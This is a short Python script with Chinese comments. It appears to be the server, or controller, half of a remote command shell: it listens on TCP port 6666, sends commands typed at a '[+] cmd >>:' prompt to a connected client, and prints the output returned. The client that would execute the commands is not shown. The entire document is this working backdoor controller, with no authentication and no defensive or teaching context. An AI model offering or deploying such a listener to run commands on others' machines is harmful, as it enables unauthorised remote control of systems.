from socket import *
from os import *

#服务端发送命令

s=socket(AF_INET,SOCK_STREAM)#IVP4 寻址  tcp协议
s.bind(('',6666))#绑定端口
s.listen(1)#开始监听一个队列
while True:
    sock,addr=s.accept()#返回两次 第一次返回连接地址 二 端口号
    print ('客户端：',addr)
    while True:

        code=input('[+] cmd >>:')
        sock.send(code.encode())
        if code=='exit':
            s.close()
            break
        result=sock.recv(10240)
        print(result.decode())


s.close()